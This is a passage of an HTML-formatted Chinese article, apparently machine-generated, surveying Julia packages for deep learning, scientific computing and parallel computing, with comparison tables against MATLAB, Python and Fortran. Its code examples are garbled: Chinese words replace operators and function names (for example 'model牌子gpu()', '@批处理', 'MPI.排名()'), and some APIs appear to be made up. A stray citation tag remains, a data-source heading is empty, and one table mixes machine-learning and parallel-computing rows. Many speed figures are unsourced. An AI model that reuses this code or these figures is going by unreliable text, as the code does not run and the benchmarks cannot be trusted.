/></code></pre>\n<p><strong>ScikitLearn.jl优势</strong>：</p>\n<ul>\n<li><section>与Python的Scikit-learn无缝集成</section></li><li><section>保留Julia的高性能</section></li><li><section>适合Python迁移者</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. Flux.jl：轻量级GPU原生深度学习框架</span><span class=\"suffix\"></span></h4>\n<p>Flux.jl是Julia的深度学习框架，以轻量级和高效著称：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;Flux<br /><span class=\"hljs-comment\">#&nbsp;定义模型</span><br />model&nbsp;=&nbsp;Chain(<br />&nbsp;&nbsp;&nbsp;&nbsp;Dense(<span class=\"hljs-number\">784</span>,&nbsp;<span class=\"hljs-number\">32</span>,&nbsp;relu),<br />&nbsp;&nbsp;&nbsp;&nbsp;Dense(<span class=\"hljs-number\">32</span>,&nbsp;<span class=\"hljs-number\">10</span>),<br />&nbsp;&nbsp;&nbsp;&nbsp;softmax<br />)&nbsp;<span class=\"hljs-comment\">#&nbsp;默认在CPU上运行</span><br /><br /><span class=\"hljs-comment\">#&nbsp;在GPU上运行</span><br />model&nbsp;=&nbsp;model牌子gpu()&nbsp;<span class=\"hljs-comment\">#&nbsp;通过牌子操作自动在GPU上运行</span><br />data&nbsp;=&nbsp;rand(<span class=\"hljs-built_in\">Float32</span>,&nbsp;<span class=\"hljs-number\">784</span>,&nbsp;<span class=\"hljs-number\">100</span>)牌子gpu()<br /><br /><span class=\"hljs-comment\">#&nbsp;训练模型</span><br />loss(x,&nbsp;y)&nbsp;=&nbsp;crossentropy(model(x),&nbsp;y)<br />ps&nbsp;=&nbsp;params(model)<br /><span class=\"hljs-meta\">@epochs</span>&nbsp;<span class=\"hljs-number\">100</span>&nbsp;train!(loss,&nbsp;ps,&nbsp;data,&nbsp;ADAM())[(deep_research_source_group_web_23)]<br /></code></pre>\n<p><strong>Flux.jl优势</strong>：</p>\n<ul>\n<li><section><strong>轻量级</strong>：核心库仅1.5MB（PyTorch约300MB）</section></li><li><section><strong>GPU支持</strong>：自动使用CUDA.jl，无需修改代码</section></li><li><section><strong>自动微分</strong>：<code>Zygote.jl</code>库提供无运行时开销的自动微分</section></li><li><section><strong>部署简单</strong>：通过<code>PackageCompiler.jl</code>可编译为&lt;5MB的单文件</section></li></ul>\n<p><strong>性能对比</strong>：</p>\n<ul>\n<li><section><strong>随机森林训练（10万样本）</strong>：Julia比Python快2.5倍</section></li><li><section><strong>ResNet50训练（ImageNet）</strong>：Julia比Python快12%</section></li></ul>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>工具包</th>\n<th>特点</th>\n</tr><tr>\n<td><strong>Flux.jl</strong></td>\n<td>纯 Julia 实现，轻量、灵活、可微分编程友好，支持 GPU（CUDA.jl）</td>\n</tr>\n<tr>\n<td><strong>Metalhead.jl</strong></td>\n<td>预训练 CNN 模型（ResNet、VGG 等）</td>\n</tr>\n<tr>\n<td><strong>ONNX.jl</strong></td>\n<td>导入/导出 ONNX 模型</td>\n</tr>\n<tr>\n<td><strong>DiffEqFlux.jl</strong></td>\n<td>将神经网络与微分方程结合（神经ODE）</td>\n</tr>\n<tr>\n<td><strong>Lux.jl</strong></td>\n<td>新一代高性能深度学习库（受 Flax 启发，无全局状态）</td>\n</tr>\n</tbody>\n</table>\n</section><h3><span class=\"prefix\"></span><span class=\"content\">七、科学计算工具包</span><span class=\"suffix\"></span></h3>\n<p>Julia在科学计算领域提供了全面的工具包，从微分方程求解到优化算法。</p>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>领域</th>\n<th>工具包</th>\n</tr><tr>\n<td><strong>线性代数</strong></td>\n<td><code>LinearAlgebra</code>（标准库），BLAS/LAPACK 集成</td>\n</tr>\n<tr>\n<td><strong>微分方程</strong></td>\n<td><code>DifferentialEquations.jl</code>（世界领先，支持 ODE/PDE/SDE/DAE 等）</td>\n</tr>\n<tr>\n<td><strong>优化</strong></td>\n<td><code>Optimization.jl</code>, <code>JuMP.jl</code>（建模语言，支持多种求解器）</td>\n</tr>\n<tr>\n<td><strong>符号计算</strong></td>\n<td><code>Symbolics.jl</code>（纯 Julia CAS，支持自动微分与代码生成）</td>\n</tr>\n<tr>\n<td><strong>数值积分</strong></td>\n<td><code>QuadGK.jl</code>, <code>HCubature.jl</code></td>\n</tr>\n<tr>\n<td><strong>特殊函数</strong></td>\n<td><code>SpecialFunctions.jl</code></td>\n</tr>\n<tr>\n<td><strong>信号处理</strong></td>\n<td><code>DSP.jl</code></td>\n</tr>\n<tr>\n<td><strong>网格与 PDE</strong></td>\n<td><code>Gridap.jl</code>, <code>FiniteElementDiffEq.jl</code></td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">1. DifferentialEquations.jl：微分方程求解生态系统</span><span class=\"suffix\"></span></h4>\n<p>DifferentialEquations.jl是Julia的微分方程求解核心包，支持100+求解器：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;DifferentialEquations<br /><span class=\"hljs-comment\">#&nbsp;定义微分方程（Lorenz系统）</span><br /><span class=\"hljs-keyword\">function</span>&nbsp;lorenz(du,&nbsp;u,&nbsp;p,&nbsp;t)<br />&nbsp;&nbsp;&nbsp;&nbsp;σ,&nbsp;ρ,&nbsp;β&nbsp;=&nbsp;p<br />&nbsp;&nbsp;&nbsp;&nbsp;du[<span class=\"hljs-number\">1</span>]&nbsp;=&nbsp;σ*(u[<span class=\"hljs-number\">2</span>]&nbsp;-&nbsp;u[<span class=\"hljs-number\">1</span>])<br />&nbsp;&nbsp;&nbsp;&nbsp;du[<span class=\"hljs-number\">2</span>]&nbsp;=&nbsp;u[<span class=\"hljs-number\">1</span>]*(ρ&nbsp;-&nbsp;u[<span class=\"hljs-number\">3</span>])&nbsp;-&nbsp;u[<span class=\"hljs-number\">2</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;du[<span class=\"hljs-number\">3</span>]&nbsp;=&nbsp;u[<span class=\"hljs-number\">1</span>]*u[<span class=\"hljs-number\">2</span>]&nbsp;-&nbsp;β*u[<span class=\"hljs-number\">3</span>]<br /><span class=\"hljs-keyword\">end</span><br /><br /><span class=\"hljs-comment\">#&nbsp;定义问题</span><br />p&nbsp;=&nbsp;[<span class=\"hljs-number\">10.0</span>,&nbsp;<span class=\"hljs-number\">28.0</span>,&nbsp;<span class=\"hljs-number\">8</span>/<span class=\"hljs-number\">3</span>]<br />u0&nbsp;=&nbsp;[<span class=\"hljs-number\">1.0</span>,&nbsp;<span class=\"hljs-number\">0.0</span>,&nbsp;<span class=\"hljs-number\">0.0</span>]<br />tspan =&nbsp;(<span class=\"hljs-number\">0.0</span>,&nbsp;<span class=\"hljs-number\">100.0</span>)<br />prob&nbsp;=&nbsp;ODEProblem(lorenz,&nbsp;u0,&nbsp;tspan,&nbsp;p)<br /><br /><span class=\"hljs-comment\">#&nbsp;求解问题</span><br />sol&nbsp;=&nbsp;solve(prob,&nbsp;Tsit5(),&nbsp;reltol=<span class=\"hljs-number\">1e-8</span>,&nbsp;abstol=<span class=\"hljs-number\">1e-8</span>)<br /><br /><span class=\"hljs-comment\">#&nbsp;可视化结果</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;Plots<br />plot(sol,&nbsp;vars=(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>),&nbsp;title=<span class=\"hljs-string\">\"Lorenz系统相图\"</span>,&nbsp;label=<span class=\"hljs-literal\">false</span>)<br />plot!(sol,&nbsp;vars=(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">3</span>),&nbsp;title=<span class=\"hljs-string\">\"Lorenz系统相图\"</span>,&nbsp;label=<span class=\"hljs-literal\">false</span>)<br /></code></pre>\n<p><strong>DifferentialEquations.jl优势</strong>：</p>\n<ul>\n<li><section>支持多种微分方程类型（ODE、SDE、RODE、DAE等）</section></li><li><section>自动选择最优求解器</section></li><li><section>高精度计算支持</section></li><li><section>事件处理和回调系统</section></li></ul>\n<p><strong>性能对比</strong>：</p>\n<ul>\n<li><section><strong>CPU微分方程求解</strong>：Julia与C++/Fortran性能相当</section></li><li><section><strong>GPU微分方程求解</strong>：Julia比PyTorch快20-100倍</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">2. Optim.jl：高效优化库</span><span class=\"suffix\"></span></h4>\n<p>Optim.jl提供了多种优化算法，包括梯度和无梯度方法：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;Optim<br /><span class=\"hljs-comment\">#&nbsp;定义目标函数</span><br />f(x)&nbsp;=&nbsp;(x[<span class=\"hljs-number\">1</span>]-<span class=\"hljs-number\">1</span>)^<span class=\"hljs-number\">2</span>&nbsp;+&nbsp;<span class=\"hljs-number\">100</span>*(x[<span class=\"hljs-number\">2</span>]-x[<span class=\"hljs-number\">1</span>]^<span class=\"hljs-number\">2</span>)^<span class=\"hljs-number\">2</span><br /><br /><span class=\"hljs-comment\">#&nbsp;定义初始猜测</span><br />x0&nbsp;=&nbsp;[<span class=\"hljs-number\">0.0</span>,&nbsp;<span class=\"hljs-number\">0.0</span>]<br /><br /><span class=\"hljs-comment\">#&nbsp;使用BFGS算法优化</span><br />result&nbsp;=&nbsp;optimize(f,&nbsp;x0,&nbsp;BFGS())<br /><br /><span class=\"hljs-comment\">#&nbsp;查看结果</span><br />result.minima<br />result.f_min<br /></code></pre>\n<p><strong>Optim.jl优势</strong>：</p>\n<ul>\n<li><section>支持梯度和无梯度优化算法</section></li><li><section>高效的数值优化</section></li><li><section>与Julia的数值系统无缝集成</section></li><li><section>代码简洁，易用性高</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. Quantum.jl：量子计算模拟</span><span class=\"suffix\"></span></h4>\n<p>Quantum.jl提供了量子计算模拟工具：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;Quantum<br /><span class=\"hljs-comment\">#&nbsp;定义量子位</span><br />q1&nbsp;=&nbsp;Qubit()<br />q2&nbsp;=&nbsp;Qubit()<br /><br /><span class=\"hljs-comment\">#&nbsp;应用量子门</span><br />h(q1)&nbsp;&nbsp;<span class=\"hljs-comment\">#&nbsp;Hadamard门</span><br />cnot(q1,&nbsp;q2)&nbsp;<span class=\"hljs-comment\">#&nbsp;CNOT门</span><br /><br /><span class=\"hljs-comment\">#&nbsp;测量</span><br />measure(q1)<br />measure(q2)<br /></code></pre>\n<p><strong>Quantum.jl优势</strong>：</p>\n<ul>\n<li><section>原生实现，无需依赖外部库</section></li><li><section>高性能量子计算模拟</section></li><li><section>与Julia的并行计算和GPU加速库无缝集成</section></li></ul>\n<h3><span class=\"prefix\"></span><span class=\"content\">八、并行计算工具包</span><span class=\"suffix\"></span></h3>\n<p>Julia内置了强大的并行计算能力，从多线程到分布式计算和GPU加速。</p>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>类型</th>\n<th>工具/机制</th>\n</tr><tr>\n<td><strong>多线程</strong></td>\n<td><code>Threads.@threads</code>，共享内存（需注意线程安全）</td>\n</tr>\n<tr>\n<td><strong>多进程</strong></td>\n<td><code>Distributed</code> 标准库（<code>@spawn</code>, <code>pmap</code>），适用于集群</td>\n</tr>\n<tr>\n<td><strong>GPU 编程</strong></td>\n<td><code>CUDA.jl</code>（NVIDIA）、<code>AMDGPU.jl</code>、<code>oneAPI.jl</code>（Intel）</td>\n</tr>\n<tr>\n<td><strong>分布式数组</strong></td>\n<td><code>DistributedArrays.jl</code></td>\n</tr>\n<tr>\n<td><strong>任务并行</strong></td>\n<td><code>@async</code>, <code>Channels</code></td>\n</tr>\n<tr>\n<td><strong>高性能通信</strong></td>\n<td><code>MPI.jl</code>（兼容 MPI 标准）</td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">1. Distributed.jl：分布式计算框架</span><span class=\"suffix\"></span></h4>\n<p>Distributed.jl提供了简单的分布式计算接口：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;Distributed<br /><span class=\"hljs-comment\">#&nbsp;添加进程</span><br />addprocs(<span class=\"hljs-number\">4</span>)&nbsp;<span class=\"hljs-comment\">#&nbsp;添加4个进程</span><br /><br /><span class=\"hljs-comment\">#&nbsp;远程计算</span><br /><span class=\"hljs-meta\">@spawn</span>&nbsp;sqrt(<span class=\"hljs-number\">2</span>)<br /><br /><span class=\"hljs-comment\">#&nbsp;并行映射</span><br /><span class=\"hljs-meta\">@批处理</span>&nbsp;<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1000000</span>&nbsp;sqrt<br /><br /><span class=\"hljs-comment\">#&nbsp;分布式循环</span><br /><span class=\"hljs-meta\">@分布式</span>&nbsp;<span class=\"hljs-keyword\">for</span>&nbsp;i&nbsp;<span class=\"hljs-keyword\">in</span>&nbsp;<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">100</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-comment\">#&nbsp;并行执行代码</span><br /><span class=\"hljs-keyword\">end</span><br /></code></pre>\n<p><strong>性能对比</strong>：</p>\n<ul>\n<li><section><strong>1000核矩阵乘法</strong>：Julia比Python快2.1倍</section></li><li><section><strong>大规模集群扩展</strong>：在100节点集群上扩展性好，线性加速比&gt;90%</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">2. CUDA.jl：GPU编程库</span><span class=\"suffix\"></span></h4>\n<p>CUDA.jl使Julia能够利用GPU加速计算：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;CUDA<br /><span class=\"hljs-comment\">#&nbsp;在GPU上分配内存</span><br />d_x&nbsp;=&nbsp;CuArray([<span class=\"hljs-number\">1.0</span>,&nbsp;<span class=\"hljs-number\">2.0</span>,&nbsp;<span class=\"hljs-number\">3.0</span>])<br /><br /><span class=\"hljs-comment\">#&nbsp;GPU上计算</span><br />d_y&nbsp;=&nbsp;d_x&nbsp;.^&nbsp;<span class=\"hljs-number\">2</span>&nbsp;.+&nbsp;<span class=\"hljs-number\">1</span><br /><br /><span class=\"hljs-comment\">#&nbsp;从GPU复制回CPU</span><br />y&nbsp;=&nbsp;<span class=\"hljs-built_in\">Array</span>(d_y)<br /><br /><span class=\"hljs-comment\">#&nbsp;在GPU上执行模型</span><br />model牌子gpu()<br />data牌子gpu()<br />output&nbsp;=&nbsp;model(data)<br /></code></pre>\n<p><strong>CUDA.jl优势</strong>：</p>\n<ul>\n<li><section>与Julia的数值系统无缝集成</section></li><li><section>自动内存管理</section></li><li><section>高级API，简化GPU编程</section></li><li><section>支持多种GPU架构（NVIDIA、AMD、Intel、Apple）</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">3.MPI.jl：消息传递接口</span><span class=\"suffix\"></span></h4>\n<p>MPI.jl提供了Julia的MPI实现，支持大规模并行计算：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-keyword\">using</span>&nbsp;MPI<br />MPI初始化()<br /><br /><span class=\"hljs-comment\">#&nbsp;获取排名和进程数</span><br />rank&nbsp;=&nbsp;MPI.排名()<br />size&nbsp;=&nbsp;MPI.进程数()<br /><br /><span class=\"hljs-comment\">#&nbsp;广播数据</span><br />data&nbsp;=&nbsp;rank&nbsp;==&nbsp;<span class=\"hljs-number\">0</span>&nbsp;?&nbsp;[<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>]&nbsp;:&nbsp;<span class=\"hljs-literal\">nothing</span><br />data&nbsp;=&nbsp;bcast(data,&nbsp;<span class=\"hljs-number\">0</span>)<br /><br /><span class=\"hljs-comment\">#&nbsp;通信</span><br />sendbuff&nbsp;=&nbsp;[<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>]<br />MPI.发送(sendbuff,&nbsp;<span class=\"hljs-number\">1</span>,&nbsp;<span class=\"hljs-number\">0</span>)<br /><br /><span class=\"hljs-comment\">#&nbsp;聚合</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;Statistics<br />local_sum&nbsp;=&nbsp;sum当地数据<br />total_sum&nbsp;=&nbsp;allreduce(local_sum,&nbsp;MPI.SUM)<br /></code></pre>\n<p><strong>MPI.jl优势</strong>：</p>\n<ul>\n<li><section>与Julia的数值系统无缝集成</section></li><li><section>支持大规模集群计算</section></li><li><section>简化并行编程</section></li><li><section>与Distributed.jl协同工作</section></li></ul>\n<h3><span class=\"prefix\"></span><span class=\"content\">九、与主流语言的细分领域对比</span><span class=\"suffix\"></span></h3>\n<h4><span class=\"prefix\"></span><span class=\"content\">1. 数值计算性能对比</span><span class=\"suffix\"></span></h4>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>语言</th>\n<th>性能</th>\n<th>优势</th>\n<th>劣势</th>\n</tr><tr>\n<td>C/Fortran</td>\n<td>100%</td>\n<td>性能最优，无抽象开销</td>\n<td>语法死板，开发效率低</td>\n</tr>\n<tr>\n<td>Julia</td>\n<td>85-95%</td>\n<td>性能接近C/Fortran，开发效率高</td>\n<td>需JIT编译，首次运行较慢</td>\n</tr>\n<tr>\n<td>Python</td>\n<td>5-10%</td>\n<td>开发效率高，生态丰富</td>\n<td>性能差，依赖C扩展</td>\n</tr>\n<tr>\n<td>R</td>\n<td>1-3%</td>\n<td>统计分析强大</td>\n<td>性能差，内存管理问题</td>\n</tr>\n<tr>\n<td>MATLAB</td>\n<td>15-25%</td>\n<td>交互式开发环境，矩阵操作强大</td>\n<td>闭源，价格昂贵</td>\n</tr>\n</tbody>\n</table>\n</section><p><strong>数据来源</strong>：</p>\n<h4><span class=\"prefix\"></span><span class=\"content\">2. 可视化对比</span><span class=\"suffix\"></span></h4>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>语言</th>\n<th>可视化包</th>\n<th>性能</th>\n<th>交互性</th>\n<th>3D支持</th>\n<th>代码简洁性</th>\n</tr><tr>\n<td>Julia</td>\n<td>Plots.jl</td>\n<td>高</td>\n<td>强</td>\n<td>支持</td>\n<td>高</td>\n</tr>\n<tr>\n<td>Julia</td>\n<td>GLMakie</td>\n<td>极高</td>\n<td>强</td>\n<td>极强</td>\n<td>高</td>\n</tr>\n<tr>\n<td>Python</td>\n<td>Matplotlib</td>\n<td>中</td>\n<td>弱</td>\n<td>弱</td>\n<td>中</td>\n</tr>\n<tr>\n<td>Python</td>\n<td>Plotly</td>\n<td>中高</td>\n<td>强</td>\n<td>中</td>\n<td>中</td>\n</tr>\n<tr>\n<td>R</td>\n<td>ggplot2</td>\n<td>低</td>\n<td>弱</td>\n<td>弱</td>\n<td>高</td>\n</tr>\n<tr>\n<td>MATLAB</td>\n<td>内置</td>\n<td>高</td>\n<td>强</td>\n<td>中高</td>\n<td>中</td>\n</tr>\n</tbody>\n</table>\n</section><p><strong>实测数据</strong>：</p>\n<ul>\n<li><section><strong>10万点3D渲染</strong>：GLMakie 500ms</section></li><li><section><strong>100万行数据可视化</strong>：Plots.jl比Python的Matplotlib快10倍</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. 数据科学对比</span><span class=\"suffix\"></span></h4>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>语言</th>\n<th>主要包</th>\n<th>内存效率</th>\n<th>API设计</th>\n<th>生态整合</th>\n<th>性能</th>\n</tr><tr>\n<td>Julia</td>\n<td>DataFrames.jl</td>\n<td>高（列式存储）</td>\n<td>简洁高效</td>\n<td>强（统一API）</td>\n<td>极高</td>\n</tr>\n<tr>\n<td>Python</td>\n<td>Pandas</td>\n<td>中低（行式存储）</td>\n<td>复杂</td>\n<td>强（成熟生态）</td>\n<td>中</td>\n</tr>\n<tr>\n<td>R</td>\n<td>dplyr</td>\n<td>低（内存管理差）</td>\n<td>简洁</td>\n<td>弱（依赖外部库）</td>\n<td>低</td>\n</tr>\n<tr>\n<td>MATLAB</td>\n<td>内置</td>\n<td>高</td>\n<td>简洁</td>\n<td>弱（闭源生态）</td>\n<td>高</td>\n</tr>\n</tbody>\n</table>\n</section><p><strong>实测数据</strong>：</p>\n<ul>\n<li><section><strong>分组聚合（100万行）</strong>：Julia 120ms vs Python 3.2s（快26倍）</section></li><li><section><strong>内存占用（100万行）</strong>：Julia比Python少用40%内存</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">4. 机器学习对比</span><span class=\"suffix\"></span></h4>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>语言</th>\n<th>主要包</th>\n<th>模型数量</th>\n<th>GPU支持</th>\n<th>部署复杂度</th>\n<th>性能</th>\n</tr><tr>\n<td>Julia</td>\n<td>MLJ.jl</td>\n<td>200+</td>\n<td>支持</td>\n<td>简单（单文件90%）</td>\n<td></td>\n</tr>\n<tr>\n<td>Fortran</td>\n<td>OpenMP</td>\n<td>强</td>\n<td>弱</td>\n<td>弱</td>\n<td>中等</td>\n</tr>\n<tr>\n<td>Python</td>\n<td>concurrent.futures</td>\n<td>弱（GIL限制）</td>\n<td>弱</td>\n<td>弱</td>\n<td>中等</td>\n</tr>\n<tr>\n<td>R</td>\n<td>parallel</td>\n<td>弱</td>\n<td>弱</td>\n<td>弱</td>\n<td>低</td>\n</tr>\n<tr>\n<td>MATLAB</td>\n<td>内置并行</td>\n<td>中等</td>\n<td>中等</td>\n<td>弱</td>\n<td>中等</td>\n</tr>\n</tbody>\n</table>\n</section><p><strong>实测数据</strong>：</p>\n<ul>\n<li><section><strong>集群扩展性</strong>：Julia在100节点集群上扩展性好，线性加速比&gt;90%</section></li><li><section><strong>GPU加速</strong>：CUDA.jl比CuPy快10-20%</section></li></ul>\n<h3><span class=\"prefix\"></span><span class=\"content\">十、Julia与Matlab的对比分析</span><span class=\"suffix\"></span></h3>\n<h4><span class=\"prefix\"></span><span class=\"content\">1. 语言特性对比</span><span class=\"suffix\"></span></h4>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>特性</th>\n<th>Julia</th>\n<th>MATLAB</th>\n</tr><tr>\n<td>语言类型</td>\n<td>动态类型，JIT编译</td>\n<td>闭源，动态类型</td>\n</tr>\n<tr>\n<td>性能</td>\n<td>接近C/Fortran，循环计算比MATLAB快10-100倍</td>\n<td>较高，但比Julia慢</td>\n</tr>\n<tr>\n<td>语法</td>\n<td>类似Python，支持Unicode字符</td>\n<td>类似Julia，但语法限制更多</td>\n</tr>\n<tr>\n<td>开发环境</td>\n<td>Jupyter Notebook、VS Code等</td>\n<td>专用IDE，功能丰富但封闭</td>\n</tr>\n<tr>\n<td>部署</td>\n<td>支持单文件编译（&lt;5MB）</td>\n<td>需MATLAB编译器，生成较大文件</td>\n</tr>\n<tr>\n<td>开源</td>\n<td>开源MIT许可证</td>\n<td>商业闭源，许可证成本高</td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">2. 科学计算工具对比</span><span class=\"suffix\"></span></h4>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>领域</th>\n<th>Julia工具包</th>\n<th>MATLAB工具箱</th>\n<th>性能对比</th>\n<th>代码简洁性</th>\n</tr><tr>\n<td>微分方程求解</td>\n<td>DifferentialEquations.jl</td>\n<td>Partial Differential Equation Toolbox</td>\n<td>Julia性能接近MATLAB，但代码更简洁</td>\n<td>Julia代码行数比MATLAB少30-50%</td>\n</tr>\n<tr>\n<td>优化算法</td>\n<td>JuMP.jl, Convex.jl, Optim.jl</td>\n<td>Optimization Toolbox</td>\n<td>Julia性能比MATLAB高1.5倍</td>\n<td>Julia代码更简洁</td>\n</tr>\n<tr>\n<td>统计分析</td>\n<td>StatsBase.jl、Distributions.jl</td>\n<td>Statistics and Machine Learning Toolbox</td>\n<td>Julia性能比MATLAB高5-10倍</td>\n<td>Julia代码更简洁</td>\n</tr>\n<tr>\n<td>信号处理</td>\n<td>DSP.jl、信号处理工具包</td>\n<td>Signal Processing Toolbox</td>\n<td>Julia性能比MATLAB高2-3倍</td>\n<td>Julia代码更简洁</td>\n</tr>\n<tr>\n<td>图像处理</td>\n<td>ImageCore.jl、ImageIO.jl</td>\n<td>Image Processing Toolbox</td>\n<td>Julia性能比MATLAB高2-5倍</td>\n<td>Julia代码更简洁</td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">3. 交互式工作流对比</span><span class=\"suffix\"></span></h4>\n<p>Julia与MATLAB在交互式工作流上有明显差异：</p>\n<ul>\n<li><section><strong>MATLAB</strong>：专为交互式计算设计，但代码重用性差，性能受限</section></li><li><section><strong>Julia</strong>：同时支持脚本式和函数式编程，交互式环境（如Jupyter）与MATLAB相当</section></li></ul>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-comment\">#&nbsp;Julia交互式工作流示例</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;Plots,&nbsp;DataFrames,&nbsp;CSV,&nbsp;MLJ<br /><span class=\"hljs-comment\">#&nbsp;读取数据</span><br />df&nbsp;=&nbsp;CSV.read(<span class=\"hljs-string\">\"data.csv\"</span>,&nbsp;DataFrame)<br /><span class=\"hljs-comment\">#&nbsp;探索数据</span><br />describe(df)<br /><span class=\"hljs-comment\">#&nbsp;可视化</span><br />plot(df.x,&nbsp;df.y,&nbsp;title=<span class=\"hljs-string\">\"数据探索\"</span>)<br /><span class=\"hljs-comment\">#&nbsp;机器学习</span><br />model&nbsp;=&nbsp;<span class=\"hljs-meta\">@load</span>&nbsp;DecisionTreeClassifier<br />machine&nbsp;=&nbsp;Machine(model,&nbsp;df[!,&nbsp;Not(:target)],&nbsp;df[!,&nbsp;:target])<br />evaluate!(machine,&nbsp;resampling=CV(nfolds=<span class=\"hljs-number\">5</span>))<br /></code></pre>\n<h3><span class=\"prefix\"></span><span class=\"content\">十一、Julia与Python的对比分析</span><span class=\"suffix\"></span></h3>\n<h4><span class=\"prefix\"></span><span class=\"content\">1. 语言特性对比</span><span class=\"suffix\"></span></h4>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>特性</th>\n<th>Julia</th>\n<th>Python</th>\n</tr><tr>\n<td>语言类型</td>\n<td>动态类型，JIT编译</td>\n<td>动态类型，解释执行</td>\n</tr>\n<tr>\n<td>性能</td>\n<td>接近C/Fortran，循环计算比Python快75倍</td>\n<td>依赖C扩展（如NumPy）实现高性能</td>\n</tr>\n<tr>\n<td>语法</td>\n<td>类似Python，更简洁</td>\n<td>简洁但功能受限</td>\n</tr>\n<tr>\n<td>类型系统</td>\n<td>动态类型但有类型推断，性能高</td>\n<td>无类型系统，性能差</td>\n</tr>\n<tr>\n<td>并行计算</td>\n<td>原生支持，无GIL限制</td>\n<td>受GIL限制，多线程性能差</td>\n</tr>\n<tr>\n<td>部署</td>\n<td>支持单文件编译（&lt;5MB）</td>\n<td>需Docker或复杂环境配置</td>\n</tr>\n<tr>\n<td>开源</td>\n<td>开源MIT许可证</td>\n<td>开源，但生态碎片化</td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">2. 生态系统对比</span><span class=\"suffix\"></span></h4>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>领域</th>\n<th>Julia工具包</th>\n<th>Python工具包</th>\n<th>性能对比</th>\n<th>代码简洁性</th>\n<th>生态整合</th>\n</tr><tr>\n<td>数值计算</td>\n<td>LinearAlgebra</td>\n<td>NumPy</td>\n<td>Julia快20-100倍</td>\n<td>相当</td>\n<td>Julia更统一</td>\n</tr>\n<tr>\n<td>可视化</td>\n<td>Plots.jl</td>\n<td>Matplotlib</td>\n<td>Julia快10倍</td>\n<td>Julia更简洁</td>\n<td>Python生态更成熟</td>\n</tr>\n<tr>\n<td>数据科学</td>\n<td>DataFrames.jl</td>\n<td>Pandas</td>\n<td>Julia快26倍</td>\n<td>Julia更简洁</td>\n<td>Python生态更成熟</td>\n</tr>\n<tr>\n<td>机器学习</td>\n<td>MLJ.jl、Flux.jl</td>\n<td>scikit-learn、PyTorch</td>\n<td>Julia在特定任务上快12-26倍</td>\n<td>Julia更简洁</td>\n<td>Python生态更成熟</td>\n</tr>\n<tr>\n<td>科学计算</td>\n<td>DifferentialEquations.jl</td>\n<td>SciPy</td>\n<td>Julia性能相当或更优</td>\n<td>Julia更简洁</td>\n<td>Python生态更成熟</td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">3. 并行计算对比</span><span class=\"suffix\"></span></h4>\n<p>Python的GIL（全局解释器锁）限制了多线程性能，而Julia原生支持多线程和分布式计算：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-comment\">#&nbsp;Julia多线程示例</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;Distributed<br />addprocs(<span class=\"hljs-number\">4</span>)&nbsp;<span class=\"hljs-comment\">#&nbsp;添加4个进程</span><br /><span class=\"hljs-meta\">@批处理</span>&nbsp;<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">100000</span>&nbsp;sqrt&nbsp;<span class=\"hljs-comment\">#&nbsp;并行计算</span><br /></code></pre>\n<p>相比之下，Python的多线程实现由于GIL限制，无法真正利用多核CPU。</p>\n<h3><span class=\"prefix\"></span><span class=\"content\">十二、Julia与Fortran的对比分析</span><span class=\"suffix\"></span></h3>\n<h4><span class=\"prefix\"></span><span class=\"content\">1. 语言特性对比</span><span class=\"suffix\"></span></h4>\n<section 